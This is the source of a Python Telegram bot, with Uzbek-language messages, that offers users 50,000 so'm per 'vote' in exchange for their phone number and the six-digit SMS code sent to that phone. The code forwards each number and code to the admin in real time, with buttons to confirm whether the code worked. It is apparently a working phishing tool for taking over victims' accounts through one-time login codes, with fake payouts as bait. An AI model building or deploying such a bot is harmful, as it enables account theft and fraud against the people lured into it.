import asyncio
import asyncpg
import os
import logging
import re
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ================= KONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DATABASE_URL = os.getenv("DATABASE_URL")

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN topilmadi!")
    exit(1)

if ADMIN_ID == 0:
    logger.error("❌ ADMIN_ID topilmadi!")
    exit(1)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# ================= HOLATLAR =================
user_states = {}
user_phones = {}
admin_states = {}
withdraw_states = {}

# ================= TUGMALAR =================
phone_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton("📞 Telefon raqamni yuborish", request_contact=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

# Foydalanuvchi menyusi - Ovoz berish tugmasi bilan
user_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton("🗳️ Ovoz berish")],
        [KeyboardButton("💳 Hamyon"), KeyboardButton("💰 Balans")],
        [KeyboardButton("💸 Yechish")]
    ],
    resize_keyboard=True
)

# Admin menyusi
admin_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton("📊 Statistika")],
        [KeyboardButton("📨 Barchaga xabar")],
        [KeyboardButton("📋 Kutayotgan kodlar")],
        [KeyboardButton("💸 Yechish so'rovlari")]
    ],
    resize_keyboard=True
)

# ================= TELEFON RAQAMNI TEKSHIRISH =================
def normalize_phone(phone):
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    
    if phone.startswith('+998') and len(phone) == 13:
        return phone
    
    if phone.startswith('998') and len(phone) == 12:
        return '+' + phone
    
    if len(phone) == 9 and phone.startswith('9'):
        return '+998' + phone
    
    return None

def is_valid_phone(phone):
    normalized = normalize_phone(phone)
    if not normalized:
        return False
    
    if normalized.startswith('+998') and len(normalized) == 13:
        number = normalized[4:]
        if len(number) == 9 and number.isdigit():
            return True
    
    return False

# ================= DATABASE =================
async def get_db():
    try:
        return await asyncpg.connect(DATABASE_URL)
    except Exception as e:
        logger.error(f"❌ Database ulanishda xatolik: {e}")
        raise

async def init_db():
    try:
        conn = await get_db()
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE NOT NULL,
                phone VARCHAR(20) NOT NULL,
                balance INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                code VARCHAR(10) NOT NULL,
                telegram_id BIGINT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                amount INTEGER NOT NULL,
                type VARCHAR(20) DEFAULT 'deposit',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS withdraws (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                phone VARCHAR(20) NOT NULL,
                amount INTEGER NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.close()
        logger.info("✅ Database tayyor")
    except Exception as e:
        logger.error(f"❌ Database xatosi: {e}")

# ================= 1. START =================
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"👤 /start bosildi: {telegram_id}")
    
    if telegram_id == ADMIN_ID:
        await message.answer(
            "👋 Xush kelibsiz, Admin!",
            reply_markup=admin_menu
        )
        return
    
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT * FROM users WHERE telegram_id = $1",
            telegram_id
        )
        await conn.close()
        
        if user:
            await message.answer(
                f"👋 <b>Xush kelibsiz!</b>\n\n"
                f"📱 <b>Telefon:</b> {user['phone']}\n"
                f"💰 <b>Balans:</b> {user['balance']:,} so'm\n\n"
                f"🎁 <b>Yana ovoz bering va yana 50 000 so'm oling!</b>\n\n"
                f"👇 Pastdagi tugmalardan foydalaning:",
                reply_markup=user_menu,
                parse_mode="HTML"
            )
        else:
            user_states[telegram_id] = "waiting_phone"
            await message.answer(
                f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
                f"💰 <b>1 OVOZ = 50 000 SO'M</b>\n\n"
                f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
                f"📝 <b>Qanday ishlaydi:</b>\n"
                f"1️⃣ Telefon raqamingizni yuboring\n"
                f"2️⃣ SMS kodni kiriting\n"
                f"3️⃣ Admin tasdiqlaydi\n"
                f"4️⃣ 50 000 so'm olasiz!\n\n"
                f"⚡️ <b>Tez va oson!</b>\n"
                f"💎 <b>Kafolatlangan to'lov!</b>\n\n"
                f"📱 <b>Telefon raqamingizni yuboring:</b>\n"
                f"(Kontakt tugmasi yoki qo'lda yozing)",
                reply_markup=phone_keyboard,
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"❌ Start xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi! Qaytadan /start bosing")

# ================= 2. OVOZ BERISH TUGMASI =================
@dp.message_handler(lambda msg: msg.text == "🗳️ Ovoz berish")
async def vote_start(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"🗳️ Ovoz berish bosildi: {telegram_id}")
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    # Foydalanuvchi ro'yxatdan o'tganmi?
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT * FROM users WHERE telegram_id = $1",
            telegram_id
        )
        await conn.close()
        
        if user:
            # Ro'yxatdan o'tgan - yangi ovoz berish uchun telefon raqam so'rash
            user_states[telegram_id] = "waiting_phone"
            await message.answer(
                f"🗳️ <b>OVOZ BERISH</b>\n\n"
                f"💰 1 ta ovoz = 50 000 so'm\n\n"
                f"📱 Telefon raqamingizni yuboring:\n"
                f"(Kontakt tugmasi yoki qo'lda yozing)",
                reply_markup=phone_keyboard,
                parse_mode="HTML"
            )
        else:
            # Ro'yxatdan o'tmagan
            user_states[telegram_id] = "waiting_phone"
            await message.answer(
                f"🗳️ <b>OVOZ BERISH</b>\n\n"
                f"💰 1 ta ovoz = 50 000 so'm\n\n"
                f"📱 Avval telefon raqamingizni yuboring:\n"
                f"(Kontakt tugmasi yoki qo'lda yozing)",
                reply_markup=phone_keyboard,
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"❌ Ovoz berish xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 3. TELEFON RAQAM (Kontakt orqali) =================
@dp.message_handler(content_types=['contact'])
async def receive_phone_contact(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("❌ Siz adminsiz, kontakt yubora olmaysiz!")
        return
    
    if user_states.get(telegram_id) != "waiting_phone":
        await message.answer("❌ Iltimos, /start yoki 🗳️ Ovoz berish tugmasini bosing!")
        return
    
    phone = message.contact.phone_number
    logger.info(f"📞 Kontakt telefon: {telegram_id} -> {phone}")
    
    await process_phone(message, phone)

# ================= 4. TELEFON RAQAM (Qo'lda yozish) =================
@dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_phone")
async def receive_phone_text(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        return
    
    phone = message.text.strip()
    logger.info(f"📞 Qo'lda telefon: {telegram_id} -> {phone}")
    
    if not is_valid_phone(phone):
        await message.answer(
            "❌ Noto'g'ri telefon raqam formati!\n\n"
            "To'g'ri formatlar:\n"
            "• +998901234567\n"
            "• 998901234567\n"
            "• 901234567\n\n"
            "Iltimos, qaytadan kiriting:"
        )
        return
    
    normalized_phone = normalize_phone(phone)
    await process_phone(message, normalized_phone)

async def process_phone(message: types.Message, phone: str):
    telegram_id = message.from_user.id
    
    logger.info(f"📞 Telefon qabul qilindi: {telegram_id} -> {phone}")
    
    user_phones[telegram_id] = phone
    user_states[telegram_id] = "waiting_code"
    
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
            telegram_id, phone
        )
        await conn.close()
        logger.info(f"✅ Foydalanuvchi saqlandi: {telegram_id}")
    except Exception as e:
        logger.error(f"❌ Foydalanuvchini saqlashda xatolik: {e}")
    
    await message.answer(
        f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
        f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:"
    )
    
    # ADMIN'GA TELEFON RAQAMNI YUBORISH
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📱 <b>YANGI TELEFON RAQAM</b>\n\n"
            f"🆔 Foydalanuvchi ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"⏳ Kod kutilmoqda...",
            parse_mode="HTML"
        )
        logger.info(f"✅ Admin'ga telefon raqam yuborildi")
    except Exception as e:
        logger.error(f"❌ Admin'ga telefon raqam yuborishda xatolik: {e}")

# ================= 5. KODNI QABUL QILISH =================
@dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    logger.info(f"🔑 Kod kiritildi: {telegram_id} -> {code}")
    
    if not phone:
        await message.answer("❌ Xatolik yuz berdi! /start buyrug'ini bosing")
        return
    
    if len(code) != 6 or not code.isdigit():
        await message.answer("❌ Iltimos, 6 xonali raqamli kod kiriting:")
        return
    
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO codes (phone, code, telegram_id, status) "
            "VALUES ($1, $2, $3, 'pending')",
            phone, code, telegram_id
        )
        await conn.close()
        logger.info(f"✅ Kod bazaga saqlandi: {telegram_id} -> {code}")
    except Exception as e:
        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
    
    await message.answer(
        "⏳ Kodingiz qabul qilindi!\n"
        "Admin tekshirib, tasdiqlaydi...",
        reply_markup=user_menu
    )
    
    # ADMIN'GA KODNI YUBORISH
    try:
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("✅ To'g'ri kod (+50 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
            InlineKeyboardButton("❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
        )
        
        await bot.send_message(
            ADMIN_ID,
            f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
            f"🆔 Foydalanuvchi ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"🔑 Kiritilgan kod: <code>{code}</code>\n\n"
            f"⏳ Iltimos, bu kodni tekshiring va tasdiqlang!",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        logger.info(f"✅ Admin'ga kod tekshirish uchun yuborildi")
    except Exception as e:
        logger.error(f"❌ Admin'ga kod yuborishda XATOLIK: {e}")
    
    user_states[telegram_id] = "done"

# ================= 6. ADMIN TASDIQLASH =================
@dp.callback_query_handler(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    logger.info(f"📋 Admin harakati: {action}")
    
    if action == "verify":
        telegram_id = int(data[1])
        phone = data[2]
        code = data[3]
        
        try:
            conn = await get_db()
            result = await conn.execute(
                "UPDATE codes SET status = 'verified' "
                "WHERE phone = $1 AND code = $2 AND telegram_id = $3 AND status = 'pending'",
                phone, code, telegram_id
            )
            
            if result == "UPDATE 1":
                await conn.execute(
                    "UPDATE users SET balance = balance + 50000 WHERE telegram_id = $1",
                    telegram_id
                )
                await conn.execute(
                    "INSERT INTO transactions (telegram_id, amount, type) VALUES ($1, 50000, 'deposit')",
                    telegram_id
                )
                await conn.close()
                
                try:
                    await bot.send_message(
                        telegram_id,
                        f"✅ <b>TABRIKLAYMIZ!</b> 🎉\n\n"
                        f"Sizning ovozingiz qabul qilindi!\n"
                        f"💰 Hisobingizga <b>+50 000 so'm</b> qo'shildi!\n\n"
                        f"💳 Hamyonni ko'rish uchun pastdagi tugmani bosing",
                        reply_markup=user_menu,
                        parse_mode="HTML"
                    )
                    logger.info(f"✅ Foydalanuvchiga tasdiqlash xabari yuborildi: {telegram_id}")
                except Exception as e:
                    logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
                
                await callback.message.edit_text(
                    f"✅ <b>TASDIQLANDI!</b>\n\n"
                    f"🆔 ID: {telegram_id}\n"
                    f"📞 Tel: {phone}\n"
                    f"🔑 Kod: {code}\n"
                    f"💰 +50 000 so'm qo'shildi",
                    parse_mode="HTML"
                )
                await callback.answer("✅ Kod tasdiqlandi!")
                logger.info(f"✅ Kod tasdiqlandi: {telegram_id}")
            else:
                await callback.answer("❌ Kod allaqachon qayta ishlangan!")
                
        except Exception as e:
            logger.error(f"❌ Tasdiqlashda xatolik: {e}")
            await callback.answer("❌ Xatolik yuz berdi!")
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE codes SET status = 'rejected' "
                "WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            await conn.close()
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ Kechirasiz, siz kiritgan kod noto'g'ri!\n\n"
                    "Iltimos, qaytadan urinib ko'ring: 🗳️ Ovoz berish",
                    reply_markup=user_menu
                )
                logger.info(f"❌ Foydalanuvchiga rad etish xabari yuborildi: {telegram_id}")
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n"
                f"🆔 ID: {telegram_id}\n"
                f"Kod noto'g'ri deb topildi",
                parse_mode="HTML"
            )
            await callback.answer("❌ Kod rad etildi!")
            logger.info(f"❌ Kod rad etildi: {telegram_id}")
            
        except Exception as e:
            logger.error(f"❌ Rad etishda xatolik: {e}")
            await callback.answer("❌ Xatolik yuz berdi!")

# ================= 7. HAMYON / BALANS =================
@dp.message_handler(lambda msg: msg.text in ["💳 Hamyon", "💰 Balans"])
async def show_balance(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            telegram_id
        )
        await conn.close()
        
        if user:
            balance = user['balance']
            
            await message.answer(
                f"💳 <b>Hamyon</b>\n\n"
                f"💰 Balans: {balance:,} so'm\n\n"
                f"💸 Yechish uchun kamida 100 000 so'm bo'lishi kerak.",
                reply_markup=user_menu,
                parse_mode="HTML"
            )
        else:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
        await message.answer("❌ Balansni olishda xatolik!")

# ================= 8. YECHISH =================
@dp.message_handler(lambda msg: msg.text == "💸 Yechish")
async def withdraw_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            telegram_id
        )
        await conn.close()
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        balance = user['balance']
        
        if balance == 0:
            await message.answer(
                "❌ Sizning hisobingizda mablag' yo'q!",
                reply_markup=user_menu
            )
            return
        
        if balance < 100000:
            await message.answer(
                f"❌ Hozirgi balansingiz: {balance:,} so'm\n\n"
                f"💰 Yechish uchun kamida 100 000 so'm bo'lishi kerak!\n"
                f"Yana {100000 - balance:,} so'm kerak.",
                reply_markup=user_menu
            )
            return
        
        withdraw_states[telegram_id] = "waiting_withdraw_phone"
        await message.answer(
            f"💰 Balansingiz: {balance:,} so'm\n\n"
            f"📱 Pul yechish uchun telefon raqamingizni yuboring:\n\n"
            f"Masalan: +998901234567\n"
            f"yoki: 998901234567\n"
            f"yoki: 901234567"
        )
        
    except Exception as e:
        logger.error(f"❌ Yechish xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 9. YECHISH UCHUN TELEFON =================
@dp.message_handler(lambda msg: withdraw_states.get(msg.from_user.id) == "waiting_withdraw_phone")
async def withdraw_phone(message: types.Message):
    telegram_id = message.from_user.id
    phone = message.text.strip()
    
    logger.info(f"📱 Yechish telefoni: {telegram_id} -> {phone}")
    
    if not is_valid_phone(phone):
        await message.answer(
            "❌ Noto'g'ri telefon raqam formati!\n\n"
            "To'g'ri formatlar:\n"
            "• +998901234567\n"
            "• 998901234567\n"
            "• 901234567\n\n"
            "Iltimos, qaytadan kiriting:"
        )
        return
    
    normalized_phone = normalize_phone(phone)
    
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await conn.close()
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        balance = user['balance']
        
        if balance < 100000:
            await conn.close()
            await message.answer(
                f"❌ Balansingiz yetarli emas!\n"
                f"Joriy balans: {balance:,} so'm\n"
                f"Kerak: 100 000 so'm",
                reply_markup=user_menu
            )
            withdraw_states.pop(telegram_id, None)
            return
        
        await conn.execute(
            "INSERT INTO withdraws (telegram_id, phone, amount, status) "
            "VALUES ($1, $2, $3, 'pending')",
            telegram_id, normalized_phone, balance
        )
        await conn.close()
        
        await message.answer(
            f"✅ Yechish so'rovingiz qabul qilindi!\n\n"
            f"💰 Summa: {balance:,} so'm\n"
            f"📱 Telefon: {normalized_phone}\n\n"
            f"⏳ Admin tekshirib, pulni yuboradi.",
            reply_markup=user_menu
        )
        
        try:
            keyboard = InlineKeyboardMarkup(row_width=2)
            keyboard.add(
                InlineKeyboardButton("✅ To'landi", callback_data=f"withdraw_done_{telegram_id}_{balance}"),
                InlineKeyboardButton("❌ Rad etish", callback_data=f"withdraw_reject_{telegram_id}")
            )
            
            await bot.send_message(
                ADMIN_ID,
                f"💸 <b>YECHISH SO'ROVI</b>\n\n"
                f"🆔 ID: <code>{telegram_id}</code>\n"
                f"📱 Telefon: <code>{normalized_phone}</code>\n"
                f"💰 Summa: <code>{balance:,} so'm</code>\n\n"
                f"⏳ To'lovni amalga oshiring!",
                reply_markup=keyboard,
                parse_mode="HTML"
            )
            logger.info(f"✅ Admin'ga yechish so'rovi yuborildi")
        except Exception as e:
            logger.error(f"❌ Admin'ga yechish so'rovini yuborishda xatolik: {e}")
        
        withdraw_states.pop(telegram_id, None)
        
    except Exception as e:
        logger.error(f"❌ Yechish telefon xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")

# ================= 10. ADMIN YECHISH TASDIQLASH =================
@dp.callback_query_handler(lambda c: c.data.startswith(("withdraw_done_", "withdraw_reject_")))
async def admin_withdraw_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[1]
    
    if action == "done":
        telegram_id = int(data[2])
        amount = int(data[3])
        
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE users SET balance = 0 WHERE telegram_id = $1",
                telegram_id
            )
            await conn.execute(
                "INSERT INTO transactions (telegram_id, amount, type) VALUES ($1, $2, 'withdraw')",
                telegram_id, amount
            )
            await conn.execute(
                "UPDATE withdraws SET status = 'completed' WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            await conn.close()
            
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ To'lov amalga oshirildi!\n\n"
                    f"💰 Summa: {amount:,} so'm\n"
                    f"📱 Pul telefon raqamingizga yuborildi.",
                    reply_markup=user_menu
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"✅ <b>TO'LANDI!</b>\n\n"
                f"🆔 ID: {telegram_id}\n"
                f"💰 Summa: {amount:,} so'm",
                parse_mode="HTML"
            )
            await callback.answer("✅ To'lov tasdiqlandi!")
            logger.info(f"✅ Yechish tasdiqlandi: {telegram_id}")
            
        except Exception as e:
            logger.error(f"❌ Yechish tasdiqlashda xatolik: {e}")
            await callback.answer("❌ Xatolik!")
    
    elif action == "reject":
        telegram_id = int(data[2])
        
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE withdraws SET status = 'rejected' WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            await conn.close()
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ Yechish so'rovingiz rad etildi!",
                    reply_markup=user_menu
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n"
                f"🆔 ID: {telegram_id}",
                parse_mode="HTML"
            )
            await callback.answer("❌ Rad etildi!")
            logger.info(f"❌ Yechish rad etildi: {telegram_id}")
            
        except Exception as e:
            logger.error(f"❌ Yechish rad etishda xatolik: {e}")
            await callback.answer("❌ Xatolik!")

# ================= 11. ADMIN YECHISH SO'ROVLARI =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "💸 Yechish so'rovlari")
async def withdraw_list(message: types.Message):
    try:
        conn = await get_db()
        withdraws = await conn.fetch(
            "SELECT * FROM withdraws WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        await conn.close()
        
        if withdraws:
            text = "💸 <b>YECHISH SO'ROVLARI:</b>\n\n"
            for w in withdraws:
                text += f"🆔 ID: <code>{w['telegram_id']}</code>\n"
                text += f"📱 Tel: <code>{w['phone']}</code>\n"
                text += f"💰 Summa: <code>{w['amount']:,} so'm</code>\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Yechish so'rovlari yo'q")
    except Exception as e:
        logger.error(f"❌ Yechish so'rovlari xatosi: {e}")
        await message.answer("❌ Xatolik!")

# ================= 12. ADMIN STATISTIKA =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    try:
        conn = await get_db()
        users_count = await conn.fetchval("SELECT COUNT(*) FROM users")
        pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending'")
        verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
        rejected = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'rejected'")
        total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
        pending_withdraws = await conn.fetchval("SELECT COUNT(*) FROM withdraws WHERE status = 'pending'")
        await conn.close()
        
        await message.answer(
            f"📊 <b>STATISTIKA</b>\n\n"
            f"👥 Foydalanuvchilar: {users_count}\n"
            f"💰 Jami balans: {total_balance:,} so'm\n"
            f"⏳ Kutayotgan kodlar: {pending}\n"
            f"✅ Tasdiqlangan: {verified}\n"
            f"❌ Rad etilgan: {rejected}\n"
            f"💸 Yechish so'rovlari: {pending_withdraws}",
            parse_mode="HTML"
        )
        logger.info("📊 Statistika ko'rsatildi")
    except Exception as e:
        logger.error(f"❌ Statistika xatosi: {e}")
        await message.answer("❌ Statistika olishda xatolik!")

# ================= 13. KUTAYOTGAN KODLAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
async def pending_codes(message: types.Message):
    try:
        conn = await get_db()
        codes = await conn.fetch(
            "SELECT * FROM codes WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        await conn.close()
        
        if codes:
            text = "📋 <b>KUTAYOTGAN KODLAR:</b>\n\n"
            for c in codes:
                text += f"🆔 ID: <code>{c['telegram_id']}</code>\n"
                text += f"📞 Tel: <code>{c['phone']}</code>\n"
                text += f"🔑 Kod: <code>{c['code']}</code>\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Kutayotgan kodlar yo'q")
        logger.info("📋 Kutayotgan kodlar ko'rsatildi")
    except Exception as e:
        logger.error(f"❌ Kodlar ro'yxatida xatolik: {e}")
        await message.answer("❌ Kodlar ro'yxatini olishda xatolik!")

# ================= 14. BARCHAGA XABAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
async def broadcast_start(message: types.Message):
    admin_states[ADMIN_ID] = "waiting_message"
    await message.answer("📨 Xabar matnini yozing:\n(Bekor qilish uchun /cancel bosing)")

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
async def broadcast_send(message: types.Message):
    if message.text == "/cancel":
        admin_states.pop(ADMIN_ID, None)
        await message.answer("❌ Bekor qilindi!", reply_markup=admin_menu)
        return
    
    text = message.text
    admin_states.pop(ADMIN_ID, None)
    
    try:
        conn = await get_db()
        users = await conn.fetch("SELECT telegram_id FROM users")
        await conn.close()
        
        if not users:
            await message.answer("❌ Foydalanuvchilar yo'q!")
            return
        
        sent = 0
        failed = 0
        
        await message.answer(f"⏳ Xabar {len(users)} ta foydalanuvchiga yuborilmoqda...")
        
        for user in users:
            try:
                await bot.send_message(
                    user['telegram_id'],
                    f"📨 <b>XABAR</b>\n\n{text}",
                    parse_mode="HTML"
                )
                sent += 1
                await asyncio.sleep(0.05)
            except Exception as e:
                failed += 1
                logger.error(f"❌ Xabar yuborilmadi {user['telegram_id']}: {e}")
        
        await message.answer(
            f"✅ Xabar yuborildi!\n"
            f"✅ Yuborildi: {sent}\n"
            f"❌ Yuborilmadi: {failed}",
            reply_markup=admin_menu
        )
    except Exception as e:
        logger.error(f"❌ Broadcast xatosi: {e}")
        await message.answer("❌ Xabar yuborishda xatolik!")

# ================= 15. BALANS =================
@dp.message_handler(commands=['balance'])
async def check_balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            message.from_user.id
        )
        await conn.close()
        
        if user:
            await message.answer(
                f"💰 Balans: {user['balance']:,} so'm",
                reply_markup=user_menu
            )
        else:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
        await message.answer("❌ Balansni olishda xatolik!")

# ================= MAIN =================
async def on_startup(dp):
    logger.info("🤖 Bot ishga tushmoqda...")
    logger.info(f"🔑 Bot token: {BOT_TOKEN[:10]}...")
    logger.info(f"👤 Admin ID: {ADMIN_ID}")
    
    await init_db()
    
    logger.info("✅ Bot tayyor!")

if __name__ == "__main__":
    executor.start_polling(dp, on_startup=on_startup, skip_updates=True)
